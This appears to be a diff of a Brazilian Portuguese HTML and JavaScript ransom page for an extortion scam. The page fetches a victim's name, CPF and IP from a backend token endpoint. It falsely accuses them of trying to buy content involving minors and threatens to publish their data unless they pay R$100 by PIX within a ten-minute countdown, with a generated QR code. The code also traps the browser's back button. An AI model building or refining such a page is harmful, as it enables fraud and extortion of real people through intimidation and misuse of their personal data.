@@ -2,231 +2,303 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-  <title>VAZAMENTO DETECTADO</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>VOCÊ FOI PEGO NO FLAGRANTE</title>
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      cursor: none !important;
     }
     
     html, body {
-      background: #000000;
-      color: #ffffff;
-      font-family: 'Courier New', monospace;
-      font-size: 16px;
-      line-height: 1.4;
-      height: auto;
+      background: #F4F4F4;
+      color: #111;
+      font-family: Arial, Roboto, sans-serif;
+      font-size: 18px;
+      line-height: 1.6;
+      height: 100vh;
       overflow-x: hidden;
-      overflow-y: auto;
       display: flex;
       justify-content: center;
-      align-items: flex-start;
-      padding: 20px 0;
-      user-select: none;
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-      touch-action: pan-y;
-      -webkit-touch-callout: none;
-      -webkit-tap-highlight-color: transparent;
+      align-items: center;
+      padding: 20px;
     }
     
-    .central-rectangle {
-      width: 80%;
-      max-width: 90vw;
-      border: 1px solid #cccccc;
-      padding: 16px;
-      margin: auto;
-      background: transparent;
+    .container {
+      width: 100%;
+      max-width: 800px;
+      background: #F4F4F4;
+      padding: 30px;
       text-align: center;
     }
     
     .main-title {
       font-size: 32px;
       font-weight: bold;
-      color: #ff0000;
+      color: #D32F2F;
       margin-bottom: 30px;
-      text-align: center;
+      text-transform: uppercase;
     }
     
     .intro-text {
-      color: #ffffff;
-      margin: 25px 0;
-      text-align: left;
-      font-size: 16px;
-      line-height: 1.6;
-    }
-    
-    .data-section {
-      margin: 25px 0;
-      text-align: left;
-      color: #ffffff;
-    }
-    
-    .data-line {
-      margin: 10px 0;
-      font-size: 16px;
-    }
-    
-    .data-value {
+      font-size: 20px;
       font-weight: bold;
+      color: #111;
+      margin-bottom: 25px;
+      text-align: left;
     }
     
-    .server-msg {
+    .accusation-text {
       font-size: 18px;
-      font-weight: bold;
-      margin: 25px 0;
-      color: #ff0000;
-      text-align: center;
-    }
-    
-    .explanation-text {
-      color: #ffffff;
-      margin: 20px 0;
-      text-align: center;
-      font-size: 16px;
-    }
-    
-    .countdown-label {
-      font-size: 20px;
-      font-weight: bold;
-      margin: 25px 0 10px 0;
-      color: #ffffff;
-      text-align: center;
-    }
-    
-    .countdown {
-      font-size: 28px;
-      font-weight: bold;
-      color: #ff0000;
-      margin: 10px 0 25px 0;
-      text-align: center;
-    }
-    
-    .warning-text {
-      font-size: 16px;
-      margin: 20px 0;
-      color: #ffffff;
+      color: #111;
+      margin-bottom: 25px;
       text-align: left;
+      line-height: 1.8;
     }
     
-    .warning-list {
-      text-align: left;
-      margin: 15px 0;
-      padding-left: 20px;
-      color: #ffffff;
-    }
-    
-    .warning-list li {
-      margin: 8px 0;
-      color: #ffffff;
-    }
-    
-    .pix-info {
-      font-size: 24px;
-      font-weight: bold;
-      margin: 30px 0;
-      color: #ffff00;
-      text-align: center;
-    }
-    
-    .qr-section {
-      margin: 30px 0;
-      text-align: center;
+    .evidence-section {
+      background: #EEEEEE;
       padding: 20px;
-      border: 2px solid #ffff00;
-      background: rgba(255, 255, 0, 0.1);
+      border-left: 5px solid #D32F2F;
+      margin: 25px 0;
+      text-align: left;
     }
     
-    .qr-title {
+    .evidence-title {
       font-size: 20px;
       font-weight: bold;
-      color: #ffff00;
+      color: #D32F2F;
       margin-bottom: 15px;
     }
     
-    .qr-code-container {
+    .evidence-list {
+      list-style: none;
+      padding: 0;
+    }
+    
+    .evidence-list li {
+      font-size: 16px;
+      color: #111;
+      margin: 8px 0;
+      padding-left: 20px;
+      position: relative;
+    }
+    
+    .evidence-list li::before {
+      content: "•";
+      color: #D32F2F;
+      font-weight: bold;
+      position: absolute;
+      left: 0;
+    }
+    
+    .crime-warning {
+      font-size: 20px;
+      font-weight: bold;
+      color: #D32F2F;
+      margin: 30px 0;
+      text-align: center;
+    }
+    
+    .exposure-warning {
+      font-size: 18px;
+      color: #111;
+      margin: 25px 0;
+      text-align: left;
+    }
+    
+    .countdown-section {
+      background: #FFEBEE;
+      border: 2px solid #D32F2F;
+      padding: 25px;
+      margin: 30px 0;
+      text-align: center;
+    }
+    
+    .countdown-label {
+      font-size: 18px;
+      color: #111;
+      margin-bottom: 15px;
+    }
+    
+    .countdown {
+      font-size: 48px;
+      font-weight: bold;
+      color: #D32F2F;
+      font-family: 'Courier New', monospace;
+      background: #000;
+      color: #FF0000;
+      padding: 15px 30px;
+      border-radius: 5px;
+      display: inline-block;
+      letter-spacing: 2px;
+      text-shadow: 0 0 10px #FF0000;
+    }
+    
+    .countdown-warning {
+      font-size: 16px;
+      color: #111;
+      margin-top: 15px;
+      font-style: italic;
+    }
+    
+    .solution-section {
+      background: #FFF8E1;
+      border: 3px solid #FFEB3B;
+      padding: 25px;
+      margin: 30px 0;
+    }
+    
+    .solution-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #111;
+      margin-bottom: 20px;
+    }
+    
+    .solution-text {
+      font-size: 18px;
+      color: #111;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    
+    .pix-info {
+      font-size: 22px;
+      font-weight: bold;
+      color: #D32F2F;
       margin: 20px 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+    }
+    
+    .pix-details {
+      background: #FFFDE7;
+      border: 2px solid #FFC107;
+      padding: 20px;
+      margin: 20px 0;
+      text-align: left;
+    }
+    
+    .qr-section {
+      margin: 25px 0;
+      text-align: center;
+    }
+    
+    .qr-code-container {
+      display: inline-block;
+      background: white;
+      padding: 20px;
+      border: 2px solid #111;
+      margin: 15px 0;
     }
     
     .qr-code-image {
       max-width: 200px;
       max-height: 200px;
-      border: 2px solid #ffffff;
-      background: white;
-      padding: 10px;
     }
     
     .pix-code-section {
-      margin-top: 20px;
+      margin: 20px 0;
     }
     
     .pix-code-label {
       font-size: 16px;
-      color: #ffffff;
+      color: #111;
       margin-bottom: 10px;
+      font-weight: bold;
     }
     
     .pix-code {
       font-family: 'Courier New', monospace;
       font-size: 12px;
-      color: #ffff00;
-      background: rgba(0, 0, 0, 0.5);
-      padding: 10px;
-      border: 1px solid #cccccc;
+      color: #111;
+      background: #F5F5F5;
+      padding: 15px;
+      border: 1px solid #CCC;
       word-break: break-all;
-      margin-bottom: 10px;
+      text-align: left;
     }
     
     .loading-qr {
-      color: #ffff00;
+      color: #111;
       font-size: 16px;
       margin: 20px 0;
     }
     
     .error-qr {
-      color: #ff0000;
+      color: #D32F2F;
       font-size: 14px;
       margin: 20px 0;
+    }
+    
+    .final-warning {
+      background: #FFCDD2;
+      border: 2px solid #D32F2F;
+      padding: 20px;
+      margin: 30px 0;
+      text-align: left;
+    }
+    
+    .final-warning h3 {
+      color: #D32F2F;
+      font-size: 20px;
+      margin-bottom: 15px;
+    }
+    
+    .final-warning p {
+      color: #111;
+      font-size: 16px;
+      margin: 10px 0;
+    }
+    
+    .footer-threat {
+      margin-top: 40px;
+      padding-top: 20px;
+      border-top: 1px solid #CCC;
+      font-size: 14px;
+      color: #666;
+      text-align: center;
+    }
+    
+    .footer-threat p {
+      margin: 5px 0;
+    }
+    
+    .stats {
+      font-weight: bold;
+      color: #D32F2F;
     }
     
     /* Mobile responsiveness */
     @media (max-width: 768px) {
       body {
-        font-size: 14px;
-        padding: 10px 0;
+        font-size: 16px;
+        padding: 10px;
       }
       
-      .central-rectangle {
-        width: 90vw;
-        padding: 16px;
+      .container {
+        padding: 20px;
       }
       
       .main-title {
         font-size: 24px;
       }
       
+      .intro-text {
+        font-size: 18px;
+      }
+      
       .countdown {
-        font-size: 20px;
+        font-size: 32px;
+        padding: 10px 20px;
       }
       
       .pix-info {
         font-size: 18px;
       }
       
-      .qr-section {
-        margin: 20px 0;
-        padding: 15px;
-      }
-      
-      .qr-title {
-        font-size: 16px;
+      .solution-title {
+        font-size: 20px;
       }
       
       .qr-code-image {
@@ -236,93 +308,121 @@
       
       .pix-code {
         font-size: 10px;
-        padding: 8px;
-      }
-      
-      .pix-code-label {
-        font-size: 14px;
+        padding: 10px;
       }
     }
     
-    /* Disable all interactions */
-    * {
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-      user-select: none;
-      -webkit-touch-callout: none;
-      -webkit-tap-highlight-color: transparent;
-      cursor: none !important;
+    @media (max-width: 480px) {
+      .main-title {
+        font-size: 20px;
+      }
+      
+      .countdown {
+        font-size: 24px;
+        padding: 8px 15px;
+      }
+      
+      .container {
+        padding: 15px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="central-rectangle">
+  <div class="container">
     <div class="main-title">
-      VOCÊ FOI RASTREADO
+      🚨 VOCÊ FOI PEGO NO FLAGRANTE
     </div>
     
     <div class="intro-text">
-      Olá, <span class="data-value" id="nome-cliente">[NOME_DO_CLIENTE]</span><br>
-      Seu CPF <span class="data-value" id="cpf-cliente">[CPF_DO_CLIENTE]</span> foi vinculado à tentativa de compra de itens ilegais.
+      <span id="nome-cliente">[nome do cliente]</span>,<br>
+      a gente rastreou sua tentativa de comprar conteúdo proibido com menores de idade.
     </div>
     
-    <div class="data-section">
-      <div style="margin-bottom: 15px; font-weight: bold;">Dados coletados:</div>
-      <div class="data-line">- Nome completo: <span class="data-value" id="nome-completo">[NOME_DO_CLIENTE]</span></div>
-      <div class="data-line">- CPF: <span class="data-value" id="cpf-completo">[CPF_DO_CLIENTE]</span></div>
-      <div class="data-line">- Endereço (via IP): <span class="data-value" id="ip-cliente">[IP_DO_CLIENTE]</span></div>
-      <div class="data-line">- end_to_end_id: <span class="data-value" id="end-to-end-cliente">[ID_PIX_CLIENTE]</span></div>
+    <div class="accusation-text">
+      Você acessou isso às <span id="hora-tentativa">[hora da tentativa]</span>, usando o IP <span id="ip-cliente">[ip do cliente]</span>, e a porra do CPF <span id="cpf-cliente">[cpf do cliente]</span> tá amarrado junto.
+      <br><br>
+      <strong>E a gente gravou tudo.</strong>
     </div>
     
-    <div class="server-msg">
-      TODOS OS DADOS FORAM ENVIADOS PARA UM SERVIDOR INTERNACIONAL
+    <div class="evidence-section">
+      <div class="evidence-title">Temos:</div>
+      <ul class="evidence-list">
+        <li>Seu histórico</li>
+        <li>Registro de acesso completo</li>
+        <li>Print do que você tentou comprar</li>
+        <li>Seu aparelho, localização e dados do sistema</li>
+      </ul>
     </div>
     
-    <div class="explanation-text">
-      Você achou que era só um bot de vendas. Agora está no radar. E a regra é simples:
+    <div class="crime-warning">
+      Você cometeu crime. E a gente tem prova.
     </div>
     
-    <div class="countdown-label">
-      TEMPO RESTANTE:
+    <div class="exposure-warning">
+      Esse caso vai ser publicado em sites abertos, grupos de denúncia e fóruns com seu nome, CPF e IP, daqui a:
     </div>
     
-    <div class="countdown" id="contador">
-      10:00
-    </div>
-    
-    <div class="warning-text">
-      Se o pagamento de R$100,00 via PIX não for confirmado até o fim da contagem, seus dados serão:
-    </div>
-    
-    <ul class="warning-list">
-      <li>Enviados à polícia</li>
-      <li>Postados em fóruns públicos de vazamento</li>
-      <li>Associados a crimes cibernéticos</li>
-    </ul>
-    
-    <div class="qr-section">
-      <div class="qr-title">PIX DE RESGATE - R$ 100,00</div>
-      
-      <div id="qr-loading" class="loading-qr">
-        Gerando QR code PIX...
+    <div class="countdown-section">
+      <div class="countdown-label">🕒</div>
+      <div class="countdown" id="contador">10:00</div>
+      <div class="countdown-warning">
+        (esse tempo NÃO reinicia, nem se você sair. Zerou, já era.)
       </div>
-      
-      <div id="qr-container" class="qr-code-container" style="display: none;">
-        <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
+    </div>
+    
+    <div class="solution-section">
+      <div class="solution-title">✅ COMO EVITAR O VAZAMENTO</div>
+      <div class="solution-text">
+        Se tu pagou sem saber, foi enganado, ou quer impedir que isso exploda geral, tem uma chance de apagar isso da nossa base:
       </div>
+      <div class="pix-info">PIX DE APAGAMENTO: R$ 100,00</div>
       
-      <div id="pix-code-container" class="pix-code-section" style="display: none;">
-        <div class="pix-code-label">Código PIX (Copia e Cola):</div>
-        <div id="pix-code" class="pix-code"></div>
-        <div style="font-size: 12px; color: #cccccc; margin-top: 10px;">
-          Copie o código acima ou escaneie o QR code
+      <div class="pix-details">
+        <div id="qr-loading" class="loading-qr">
+          Gerando QR code PIX...
+        </div>
+        
+        <div id="qr-container" class="qr-section" style="display: none;">
+          <div class="qr-code-container">
+            <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
+          </div>
+        </div>
+        
+        <div id="pix-code-container" class="pix-code-section" style="display: none;">
+          <div class="pix-code-label">Chave PIX (Copia e Cola):</div>
+          <div id="pix-code" class="pix-code"></div>
+          <div style="font-size: 14px; color: #666; margin-top: 10px;">
+            <strong>Nome do grupo:</strong> Rede Digital Anônima
+          </div>
+        </div>
+        
+        <div id="qr-error" class="error-qr" style="display: none;">
+          Erro ao gerar QR code. Tente recarregar a página.
         </div>
       </div>
       
-      <div id="qr-error" class="error-qr" style="display: none;">
-        Erro ao gerar QR code. Tente recarregar a página.
+      <div class="solution-text">
+        Depois disso, o histórico é deletado.<br>
+        Se o tempo acabar, já era. Vai tudo pro ar.
       </div>
+    </div>
+    
+    <div class="final-warning">
+      <h3>🛑 ATENÇÃO</h3>
+      <p>Isso aqui é sério.</p>
+      <p>Não tem volta.</p>
+      <p>Não tem e-mail.</p>
+      <p>Não tem suporte.</p>
+      <p><br>A gente não é empresa. A gente é rede.</p>
+      <p><br><strong>Você foi pego fazendo merda.</strong></p>
+      <p><br>Se pagar, apaga. Se não pagar, vaza.</p>
+    </div>
+    
+    <div class="footer-threat">
+      <p>Essa mensagem foi gerada automaticamente por um dos nossos servidores.</p>
+      <p><strong>Você está sendo monitorado.</strong></p>
+      <p class="stats">Mais de 19 pessoas já foram expostas.</p>
     </div>
   </div>
 
@@ -337,11 +437,19 @@
     
     // Dados padrão
     let dadosCliente = {
-      nome: '[NOME_DO_CLIENTE]',
-      cpf: '[CPF_DO_CLIENTE]',
-      ip: '[IP_DO_CLIENTE]',
-      end_to_end_id: '[ID_PIX_CLIENTE]'
+      nome: '[nome do cliente]',
+      cpf: '[cpf do cliente]',
+      ip: '[ip do cliente]',
+      hora: '[hora da tentativa]'
     };
+    
+    // Função para obter hora atual formatada
+    function obterHoraAtual() {
+      const agora = new Date();
+      const horas = agora.getHours().toString().padStart(2, '0');
+      const minutos = agora.getMinutes().toString().padStart(2, '0');
+      return `${horas}:${minutos}`;
+    }
     
     // Função para criar nova sessão de timer
     async function criarSessaoTimer() {
@@ -467,6 +575,10 @@
       }, 1000);
     }
     
+    // Definir hora atual como padrão
+    dadosCliente.hora = obterHoraAtual();
+    document.getElementById('hora-tentativa').textContent = dadosCliente.hora;
+    
     // Tentar buscar dados reais se token existir
     if (token) {
       fetch(`/api/dados-comprador?token=${token}`)
@@ -476,20 +588,14 @@
             if (data.nome && data.nome !== 'N/A') {
               dadosCliente.nome = data.nome;
               document.getElementById('nome-cliente').textContent = dadosCliente.nome;
-              document.getElementById('nome-completo').textContent = dadosCliente.nome;
             }
             if (data.cpf && data.cpf !== 'N/A') {
               dadosCliente.cpf = data.cpf;
               document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
-              document.getElementById('cpf-completo').textContent = dadosCliente.cpf;
             }
             if (data.ip && data.ip !== 'N/A') {
               dadosCliente.ip = data.ip;
               document.getElementById('ip-cliente').textContent = dadosCliente.ip;
-            }
-            if (data.end_to_end_id && data.end_to_end_id !== 'N/A') {
-              dadosCliente.end_to_end_id = data.end_to_end_id;
-              document.getElementById('end-to-end-cliente').textContent = dadosCliente.end_to_end_id;
             }
           }
         })
@@ -526,7 +632,7 @@
           
           // Mostrar QR code
           qrImage.src = data.qr_code_base64;
-          qrContainer.style.display = 'flex';
+          qrContainer.style.display = 'block';
           
           // Mostrar código PIX
           pixCode.textContent = data.pix_copia_cola;
@@ -565,56 +671,11 @@
       }
     });
     
-    // Bloquear ações do usuário
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('selectstart', e => e.preventDefault());
-    document.addEventListener('dragstart', e => e.preventDefault());
-    
-    // Bloquear teclas comuns
-    document.addEventListener('keydown', function(e) {
-      // Bloquear F5, Ctrl+R, Ctrl+F5, etc.
-      if (e.key === 'F5' || 
-          (e.ctrlKey && (e.key === 'r' || e.key === 'R')) ||
-          (e.ctrlKey && e.key === 'F5') ||
-          (e.ctrlKey && (e.key === 'u' || e.key === 'U')) ||
-          (e.ctrlKey && (e.key === 's' || e.key === 'S')) ||
-          (e.ctrlKey && (e.key === 'p' || e.key === 'P')) ||
-          e.key === 'F12') {
-        e.preventDefault();
-        e.stopPropagation();
-        return false;
-      }
-    });
-    
-    // Bloquear zoom no mobile (permitir scroll vertical)
-    document.addEventListener('touchmove', function(e) {
-      // Só bloquear se houver mais de um toque (zoom/pinch)
-      if (e.touches.length > 1) {
-        e.preventDefault();
-      }
-      // Permitir scroll vertical com um dedo
-    }, { passive: false });
-    
-    // Bloquear double tap zoom
-    let lastTouchEnd = 0;
-    document.addEventListener('touchend', function(e) {
-      const now = (new Date()).getTime();
-      if (now - lastTouchEnd <= 300) {
-        e.preventDefault();
-      }
-      lastTouchEnd = now;
-    }, false);
-    
     // Impedir back/forward
     history.pushState(null, null, location.href);
     window.onpopstate = function() {
       history.go(1);
     };
-    
-    // Garantir cursor oculto
-    const style = document.createElement('style');
-    style.textContent = '* { cursor: none !important; }';
-    document.head.appendChild(style);
   </script>
 </body>
 </html>
